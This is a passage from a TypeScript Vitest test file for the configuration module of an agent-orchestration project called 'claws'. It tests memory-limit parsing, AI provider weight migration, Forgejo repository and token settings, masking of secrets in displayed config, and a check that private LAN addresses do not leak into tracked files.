    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    // parseInt("4.5GiB") === 4 — a 4-byte cap would kill every run instantly and
    // a 4-byte budget would serialize every run, both silently.
    process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"] = "4.5GiB";
    process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"] = "4.5GiB";
    try {
      mod.reloadConfig();
      expect(mod.AGENT_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
      // Not 0: 0 means "the operator disabled admission", so a typo must fall
      // back to the derived cgroup budget rather than switching admission off.
      expect(mod.AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES).toBeUndefined();
      expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toContain("agentWorkerMemoryMaxBytes=4.5GiB");
      expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toContain("agentWorkerMemorySharedBudgetBytes=4.5GiB");
    } finally {
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"];
      warn.mockRestore();
      mod.reloadConfig();
    }
  });

  it("falls back to the derived budget — never 0 — when the shared budget is unparseable", async () => {
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    // parseInt("abc") is NaN. Collapsing that to 0 would take the explicit
    // branch in computeAgentMemoryPolicy() and switch admission off entirely.
    process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"] = "abc";
    try {
      mod.reloadConfig();
      expect(mod.AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES).toBeUndefined();
      expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toContain("agentWorkerMemorySharedBudgetBytes=abc");
    } finally {
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"];
      warn.mockRestore();
      mod.reloadConfig();
    }
  });

  it("rejects a negative byte setting instead of clamping it to 0", async () => {
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ agentWorkerMemoryMaxBytes: -1 }));
    try {
      mod.reloadConfig();
      // Clamping to 0 would silently disable the watchdog and derived admission.
      expect(mod.AGENT_WORKER_MEMORY_MAX_BYTES).toBe(2_147_483_648);
      expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toContain("agentWorkerMemoryMaxBytes=-1 is negative");
    } finally {
      warn.mockRestore();
      fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
      mod.reloadConfig();
    }
  });

  it("neutral agent memory env wins over deprecated Claude memory alias", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ claudeWorkerMemoryMaxBytes: 123 }));

    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = String(456 * 1024 * 1024);
    process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"] = String(789 * 1024 * 1024);
    try {
      mod.reloadConfig();
      expect(mod.AGENT_WORKER_MEMORY_MAX_BYTES).toBe(789 * 1024 * 1024);
      expect(mod.CLAUDE_WORKER_MEMORY_MAX_BYTES).toBe(789 * 1024 * 1024);
    } finally {
      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
      mod.reloadConfig();
    }
  });

  it("warns once when the deprecated memory env beats a neutral config-file key", async () => {
    // Env beats the config file at every level, so an operator migrating off
    // the alias by adding agentWorkerMemoryMaxBytes to config.json sees no
    // effect — the warning is the only thing that says why.
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ agentWorkerMemoryMaxBytes: 789 * 1024 * 1024 }));
    const podCap = process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
    delete process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
    process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"] = String(456 * 1024 * 1024);
    // The latch is module-level and never resets on its own, so without this
    // the assertion would depend on whether an earlier test tripped it.
    mod.resetDeprecationWarningsForTests();
    try {
      mod.reloadConfig();
      expect(mod.AGENT_WORKER_MEMORY_MAX_BYTES).toBe(456 * 1024 * 1024);
      const warnings = () => warn.mock.calls.map((c) => String(c[0])).filter((m) => m.includes("deprecated claudeWorkerMemoryMaxBytes"));
      expect(warnings()).toHaveLength(1);
      // Reloading again must not re-warn: the notice is about the operator's
      // file, not about this reload.
      mod.reloadConfig();
      expect(warnings()).toHaveLength(1);
    } finally {
      delete process.env["CLAWS_CLAUDE_WORKER_MEMORY_MAX_BYTES"];
      if (podCap !== undefined) process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"] = podCap;
      warn.mockRestore();
      fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
      mod.resetDeprecationWarningsForTests();
      mod.reloadConfig();
    }
  });

  it("defaults minWorkWorkers to 2 and clamps it to maxWorkWorkers with one warning", async () => {
    const mod = await import("./config.js");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ maxWorkWorkers: 6 }));
    mod.resetDeprecationWarningsForTests();
    try {
      mod.reloadConfig();
      expect(mod.MIN_WORK_WORKERS).toBe(2);

      process.env["CLAWS_MIN_WORK_WORKERS"] = "9";
      mod.reloadConfig();
      expect(mod.MAX_WORK_WORKERS).toBe(6);
      expect(mod.MIN_WORK_WORKERS).toBe(6);
      mod.reloadConfig();
      const warnings = warn.mock.calls.map((c) => String(c[0])).filter((m) => m.includes("minWorkWorkers (9) is above maxWorkWorkers"));
      expect(warnings).toHaveLength(1);
    } finally {
      delete process.env["CLAWS_MIN_WORK_WORKERS"];
      warn.mockRestore();
      fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
      mod.resetDeprecationWarningsForTests();
      mod.reloadConfig();
    }
  });

  it("parses agent memory headroom, explicit shared budget, and watchdog disable", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"] = "0";
    process.env["CLAWS_AGENT_WORKER_MEMORY_HEADROOM_BYTES"] = "1610612736";
    process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"] = "4831838208";
    try {
      mod.reloadConfig();
      expect(mod.AGENT_WORKER_MEMORY_MAX_BYTES).toBe(0);
      expect(mod.AGENT_WORKER_MEMORY_HEADROOM_BYTES).toBe(1_610_612_736);
      expect(mod.AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES).toBe(4_831_838_208);
    } finally {
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_MAX_BYTES"];
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_HEADROOM_BYTES"];
      delete process.env["CLAWS_AGENT_WORKER_MEMORY_SHARED_BUDGET_BYTES"];
      mod.reloadConfig();
    }
  });

  it("defaults AI_PROVIDERS to Claude:Codex:OpenCode:Pi weights 4:2:0:0 (OpenCode and Pi pin-only)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 4 },
      codex: { enabled: true, weight: 2 },
      opencode: { enabled: true, weight: 0 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("defaults pi tier models to Anthropic-account provider/id values and reads CLAWS_PI_*_MODEL overrides", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ piCheapModel: "file/cheap" }));
    process.env["CLAWS_PI_ADEQUATE_MODEL"] = "env/adequate";

    try {
      mod.reloadConfig();

      expect(mod.PI_FABLE_MODEL).toBe("anthropic/claude-opus-5-5");
      expect(mod.PI_BEST_MODEL).toBe("anthropic/claude-opus-5-5");
      expect(mod.PI_ADEQUATE_MODEL).toBe("env/adequate");
      expect(mod.PI_CHEAP_MODEL).toBe("file/cheap");
      expect(mod.LABEL_SPECS["Use Pi"]).toEqual(expect.objectContaining({ color: "7c3aed" }));
    } finally {
      delete process.env["CLAWS_PI_ADEQUATE_MODEL"];
    }
  });

  it("migrates providerFallbackOrder to provider preference weights without disabling omitted providers", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: ["codex"] }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 2 },
      codex: { enabled: true, weight: 4 },
      opencode: { enabled: true, weight: 1 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("migrates multi-provider fallback order to descending provider weights", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: ["codex", "claude"] }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 2 },
      codex: { enabled: true, weight: 4 },
      opencode: { enabled: true, weight: 1 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("migrates toolUseProviderFallbackOrder when aiProviders is absent", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ toolUseProviderFallbackOrder: ["codex", "claude"] }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 2 },
      codex: { enabled: true, weight: 4 },
      opencode: { enabled: true, weight: 1 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("ignores duplicate and invalid legacy provider entries", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: ["bogus", "codex", "codex", "opencode"] }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 1 },
      codex: { enabled: true, weight: 4 },
      opencode: { enabled: true, weight: 2 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("ignores non-array legacy provider fallback values", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: "codex" }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: true, weight: 4 },
      codex: { enabled: true, weight: 2 },
      opencode: { enabled: true, weight: 0 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("uses explicit aiProviders over legacy keys", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({
        aiProviders: { claude: { enabled: false, weight: 4 }, opencode: { enabled: true, weight: 7 } },
        providerFallbackOrder: ["claude"],
      }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS).toEqual({
      claude: { enabled: false, weight: 4 },
      codex: { enabled: true, weight: 2 },
      opencode: { enabled: true, weight: 7 },
      pi: { enabled: true, weight: 0 },
    });
  });

  it("keeps invalid weights in config, warns on negative ones, and accepts weight 0 as pin-only", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ aiProviders: { claude: { enabled: true, weight: 0 }, codex: { enabled: true, weight: -1 }, opencode: { enabled: true, weight: 1 } } }),
    );

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS.claude).toEqual({ enabled: true, weight: 0 });
    expect(mod.AI_PROVIDERS.codex).toEqual({ enabled: true, weight: -1 });
    expect(console.warn).not.toHaveBeenCalledWith(expect.stringContaining("aiProviders.claude.weight"));
    expect(console.warn).toHaveBeenCalledWith(expect.stringContaining("aiProviders.codex.weight must be a non-negative finite number"));
  });

  it("applies provider env overrides", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ aiProviders: { claude: { enabled: true, weight: 4 } } }));
    process.env["CLAWS_CLAUDE_ENABLED"] = "false";
    process.env["CLAWS_CODEX_WEIGHT"] = "9";

    mod.reloadConfig();

    expect(mod.AI_PROVIDERS.claude.enabled).toBe(false);
    expect(mod.AI_PROVIDERS.codex.weight).toBe(9);
  });

  it("keeps invalid provider env weights present so selector eligibility disables them", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    process.env["CLAWS_CLAUDE_WEIGHT"] = "0";
    process.env["CLAWS_CODEX_WEIGHT"] = "banana";
    process.env["CLAWS_OPENCODE_WEIGHT"] = "Infinity";

    try {
      mod.reloadConfig();

      expect(mod.AI_PROVIDERS.claude.weight).toBe(0);
      expect(mod.AI_PROVIDERS.codex.weight).toBeNaN();
      expect(mod.AI_PROVIDERS.opencode.weight).toBe(Infinity);
      expect(console.warn).toHaveBeenCalledWith(expect.stringContaining("CLAWS_CODEX_WEIGHT"));
      expect(console.warn).toHaveBeenCalledWith(expect.stringContaining("CLAWS_OPENCODE_WEIGHT"));
      expect(console.warn).not.toHaveBeenCalledWith(expect.stringContaining("aiProviders.claude.weight"));
      expect(console.warn).toHaveBeenCalledWith(expect.stringContaining("aiProviders.codex.weight"));
      expect(console.warn).toHaveBeenCalledWith(expect.stringContaining("aiProviders.opencode.weight"));
    } finally {
      delete process.env["CLAWS_CLAUDE_WEIGHT"];
      delete process.env["CLAWS_CODEX_WEIGHT"];
      delete process.env["CLAWS_OPENCODE_WEIGHT"];
      mod.reloadConfig();
    }
  });

  it("writeConfig with aiProviders removes old fallback keys", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ providerFallbackOrder: ["claude"], toolUseProviderFallbackOrder: ["codex"] }),
    );

    await mod.writeConfig({ aiProviders: { claude: { enabled: true, weight: 4 }, codex: { enabled: false, weight: 2 }, opencode: { enabled: false, weight: 1 } } });

    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written.aiProviders).toEqual({ claude: { enabled: true, weight: 4 }, codex: { enabled: false, weight: 2 }, opencode: { enabled: false, weight: 1 } });
    expect(written.providerFallbackOrder).toBeUndefined();
    expect(written.toolUseProviderFallbackOrder).toBeUndefined();
  });

  it("onConfigChange fires listeners after writeConfig", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));

    const listener = vi.fn();
    mod.onConfigChange(listener);

    await mod.writeConfig({ logRetentionDays: 99 });

    expect(listener).toHaveBeenCalledTimes(1);
  });

  it.each(["constructor", "__proto__", "toString", "hasOwnProperty"])("preserves prototype-property LAN targets: %s", async (key) => {
    const mod = await import("./config.js");
    const byHost = { host: `${key}.local`, user: "explicit" };
    const byName = { host: "unknown.local", name: key };
    expect(mod.resolveLanHost(byHost)).toBe(byHost);
    expect(mod.resolveLanHost(byName)).toBe(byName);
  });

  // Cold-imports config and github-app and reads every tracked file, so it
  // needs more than the 5 s default when CI runs suites in parallel.
  it("keeps concrete LAN addresses inside approved snapshot scrub files", async () => {
    const mod = await import("./config.js");
    const { buildEnvForGh } = await import("./github-app.js");
    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    const approvedPaths = ["src/config.ts", "src/jobs/runner-monitor.test.ts"];
    const pair = mod.PUBLIC_SNAPSHOTS.find((p) => p.source === "St-John-Software/claws");
    expect(pair?.scrubPaths).toEqual(expect.arrayContaining(approvedPaths));
    // The history-cleanup workflow stays out of the snapshot.
    expect(pair?.scrubPaths).toEqual(expect.arrayContaining([".forgejo/workflows/history-cleanup.yml"]));

    // Derive the addresses from the registry so this guard does not itself
    // publish a copy of the private mappings. Report paths only on failure.
    const addresses = Object.values(mod.LAN_HOST_ALIASES).map((alias) => alias.host);
    expect(addresses.length).toBeGreaterThan(0);
    const root = fileURLToPath(new URL("../", import.meta.url));
    const files = execFileSync("git", ["ls-files", "-z"], {
      cwd: root, env: buildEnvForGh(null), encoding: "utf8",
    }).split("\0").filter(Boolean);
    const leaks = files.filter((file) => {
      if (approvedPaths.includes(file)) return false;
      const fullPath = path.join(root, file);
      if (!fs.lstatSync(fullPath).isFile()) return false;
      const content = fs.readFileSync(fullPath, "utf8");
      return addresses.some((address) => content.includes(address));
    });
    expect(leaks).toEqual([]);
  }, 30_000);

  it("preserves unknown LAN targets", async () => {
    const mod = await import("./config.js");
    expect(mod.resolveLanHost({ host: "unknown.local", user: "explicit" })).toEqual({ host: "unknown.local", user: "explicit" });
  });
});

describe("Forgejo repos (#2650)", () => {
  beforeEach(() => {
    delete process.env["CLAWS_FORGEJO_REPOS"];
    delete process.env["CLAWS_FORGEJO_BASE_URL"];
    delete process.env["CLAWS_FORGEJO_TOKEN"];
    delete process.env["CLAWS_FORGEJO_READ_TOKEN"];
    delete process.env["CLAWS_FORGEJO_ADMIN_TOKEN"];
  });

  afterEach(() => {
    delete process.env["CLAWS_FORGEJO_REPOS"];
    delete process.env["CLAWS_FORGEJO_BASE_URL"];
    delete process.env["CLAWS_FORGEJO_TOKEN"];
    delete process.env["CLAWS_FORGEJO_READ_TOKEN"];
    delete process.env["CLAWS_FORGEJO_ADMIN_TOKEN"];
  });

  it("defaults to an empty Forgejo repo list and the homelab Forgejo host with no token", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    expect(mod.FORGEJO_REPOS).toEqual([]);
    expect(mod.FORGEJO_BASE_URL).toBe("https://git.home.bstjohn.net");
    expect(mod.FORGEJO_TOKEN).toBeUndefined();
    expect(mod.isManagedRepo("St-John-Software/perudo")).toBe(false);
    expect(mod.isManagedRepo("St-John-Software/claws")).toBe(false);
  });

  it("reads the repo list from the CLAWS_FORGEJO_REPOS emergency override, case-insensitively", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    process.env["CLAWS_FORGEJO_REPOS"] = "Owner/Migrated";
    mod.reloadConfig();

    expect(mod.isManagedRepo("Owner/Migrated")).toBe(true);
    expect(mod.isManagedRepo("owner/migrated")).toBe(true);
    expect(mod.isManagedRepo("OWNER/MIGRATED")).toBe(true);
    expect(mod.isManagedRepo("St-John-Software/perudo")).toBe(false);
  });

  it("lets CLAWS_FORGEJO_REPOS override the empty default, comma-split and trimmed", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    process.env["CLAWS_FORGEJO_REPOS"] = " owner/one , owner/two ";
    mod.reloadConfig();

    expect(mod.FORGEJO_REPOS).toEqual(["owner/one", "owner/two"]);
    expect(mod.isManagedRepo("owner/from-file")).toBe(false);
  });

  it("forgejoRepoUrl joins the base URL and full name, stripping trailing slashes", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.forgejoRepoUrl("St-John-Software/perudo")).toBe(
      "https://git.home.bstjohn.net/St-John-Software/perudo",
    );

    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoBaseUrl: "https://forge.example.com//" }));
    mod.reloadConfig();
    expect(mod.forgejoRepoUrl("owner/repo")).toBe("https://forge.example.com/owner/repo");
  });

  it("reads the token from the config file and from the environment", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoToken: "file-token" }));
    mod.reloadConfig();
    expect(mod.FORGEJO_TOKEN).toBe("file-token");

    process.env["CLAWS_FORGEJO_TOKEN"] = "env-token";
    mod.reloadConfig();
    expect(mod.FORGEJO_TOKEN).toBe("env-token");
  });

  it("reads the read token from the config file and lets the environment take precedence (#3152)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoReadToken: "file-read" }));
    mod.reloadConfig();
    expect(mod.FORGEJO_READ_TOKEN).toBe("file-read");

    process.env["CLAWS_FORGEJO_READ_TOKEN"] = "env-read";
    mod.reloadConfig();
    expect(mod.FORGEJO_READ_TOKEN).toBe("env-read");
  });

  it("reads the admin token from the config file and lets the environment take precedence (#2965)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoAdminToken: "file-admin" }));
    mod.reloadConfig();
    expect(mod.FORGEJO_ADMIN_TOKEN).toBe("file-admin");

    process.env["CLAWS_FORGEJO_ADMIN_TOKEN"] = "env-admin";
    mod.reloadConfig();
    expect(mod.FORGEJO_ADMIN_TOKEN).toBe("env-admin");
  });

  it("masks the admin token in getConfigForDisplay (#2965)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoAdminToken: "file-admin" }));
    mod.reloadConfig();

    const display = mod.getConfigForDisplay();
    expect(display.forgejoAdminToken).not.toBe("file-admin");
    expect(display.forgejoAdminToken).toMatch(/^\*\*\*\*/);
  });

  it("defaults the Grafana URLs, strips a trailing slash and reads the signing key from the file only", async () => {
    const mod = await import("./config.js");

    mod.reloadConfig();
    expect(mod.PROD_GRAFANA_URL).toBe("https://grafana.bstjohn.net");
    expect(mod.FLEET_GRAFANA_URL).toBe("https://grafana.home.bstjohn.net");
    expect(mod.GRAFANA_JWT_SIGNING_KEY).toBe("");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ grafanaJwtSigningKey: "file-key", fleetGrafanaUrl: "https://g.example/" }),
    );
    process.env["CLAWS_GRAFANA_JWT_SIGNING_KEY"] = "env-key";
    mod.reloadConfig();
    expect(mod.GRAFANA_JWT_SIGNING_KEY).toBe("file-key");
    expect(mod.FLEET_GRAFANA_URL).toBe("https://g.example");
    delete process.env["CLAWS_GRAFANA_JWT_SIGNING_KEY"];
  });

  it("masks the Grafana JWT signing key in getConfigForDisplay", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ grafanaJwtSigningKey: "not-a-real-signing-key-0001" }));
    mod.reloadConfig();

    const display = mod.getConfigForDisplay();
    expect(display.grafanaJwtSigningKey).toBe("****0001");
    expect(display.grafanaJwtSigningKey).not.toContain("not-a-real");
  });

  it("tolerates the retired Grafana service-account token keys and writeConfig drops them", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(
      mod.CONFIG_PATH,
      JSON.stringify({ selfRepo: "owner1/repo1", prodGrafanaToken: "glsa_prod", fleetGrafanaToken: "glsa_fleet" }),
    );

    mod.reloadConfig();
    expect(mod.getUnknownConfigKeys()).toEqual([]);

    await mod.writeConfig({ logRetentionDays: 30 });
    const written = JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8"));
    expect(written.selfRepo).toBe("owner1/repo1");
    expect(written).not.toHaveProperty("prodGrafanaToken");
    expect(written).not.toHaveProperty("fleetGrafanaToken");
  });

  it("masks the read token in getConfigForDisplay (#3152)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ forgejoReadToken: "file-read" }));
    mod.reloadConfig();

    const display = mod.getConfigForDisplay();
    expect(display.forgejoReadToken).not.toBe("file-read");
    expect(display.forgejoReadToken).toMatch(/^\*\*\*\*/);
  });

  it("treats a discovered-but-unconfigured repo as managed, case-insensitively (#2885)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();
    expect(mod.isManagedRepo("Owner/Discovered")).toBe(false);

    mod.registerDiscoveredForgejoRepos(["Owner/Discovered"]);
    expect(mod.isManagedRepo("Owner/Discovered")).toBe(true);
    expect(mod.isManagedRepo("owner/discovered")).toBe(true);

    mod.clearDiscoveredForgejoRepos();
    expect(mod.isManagedRepo("Owner/Discovered")).toBe(false);
  });

  it("never writes forgejoRepos to config.json (#2917)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    mod.registerDiscoveredForgejoRepos(["owner/unlisted"]);

    expect(JSON.parse(fs.readFileSync(mod.CONFIG_PATH, "utf-8")).forgejoRepos).toBeUndefined();
    expect(mod.isManagedRepo("owner/unlisted")).toBe(true);

    mod.clearDiscoveredForgejoRepos();
  });

  it("selfRepoGitUrl is the self-repo on Forgejo, discovered or not", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({ selfRepo: "St-John-Software/claws" }));
    mod.reloadConfig();
    mod.clearDiscoveredForgejoRepos();

    expect(mod.selfRepoGitUrl()).toBe("https://git.home.bstjohn.net/St-John-Software/claws.git");
  });

  it("builds every managed repo's web/issue/PR URLs on Forgejo (#2650)", async () => {
    const mod = await import("./config.js");

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    process.env["CLAWS_FORGEJO_REPOS"] = "owner/migrated";
    mod.reloadConfig();

    expect(mod.webUrlForRepo("owner/migrated")).toBe("https://git.home.bstjohn.net/owner/migrated");
    expect(mod.issueUrl("owner/migrated", 7)).toBe("https://git.home.bstjohn.net/owner/migrated/issues/7");
    // Forgejo pull requests live at /pulls/{n}.
    expect(mod.prUrl("owner/migrated", 7)).toBe("https://git.home.bstjohn.net/owner/migrated/pulls/7");

    // Not yet discovered: still Forgejo, never a GitHub URL.
    expect(mod.webUrlForRepo("owner/undiscovered")).toBe("https://git.home.bstjohn.net/owner/undiscovered");
    expect(mod.issueUrl("owner/undiscovered", 7)).toBe("https://git.home.bstjohn.net/owner/undiscovered/issues/7");
    expect(mod.prUrl("owner/undiscovered", 7)).toBe("https://git.home.bstjohn.net/owner/undiscovered/pulls/7");
    // A file on the default branch: Forgejo says /src/branch/.
    expect(mod.webUrlForRepoFile("owner/migrated", "main", ".forgejo/workflows/update whyrr.yml"))
      .toBe("https://git.home.bstjohn.net/owner/migrated/src/branch/main/.forgejo/workflows/update%20whyrr.yml");
    expect(mod.webUrlForRepoFile("owner/undiscovered", "master", "k8s/app.yaml")).toBe("https://git.home.bstjohn.net/owner/undiscovered/src/branch/master/k8s/app.yaml");
  });

  it("issueUrl resolves an imported forge number to the Claws issue page, and forgeIssueUrl never does (clw_01M35GAV079FW4VJ1GN5J19ABM)", async () => {
    const mod = await import("./config.js");
    const { setImportedRef, resetImportedRefsForTest } = await import("./imported-refs-index.js");
    const NATIVE_ID = "clw_01JBQ7X4M2K8NV3TYRW9GZ5PDC";

    fs.mkdirSync(path.dirname(mod.CONFIG_PATH), { recursive: true });
    fs.writeFileSync(mod.CONFIG_PATH, JSON.stringify({}));
    mod.reloadConfig();

    try {
      // Before the import is indexed, the old forge number still links out.
      expect(mod.issueUrl("owner/repo", 7)).toBe("https://git.home.bstjohn.net/owner/repo/issues/7");

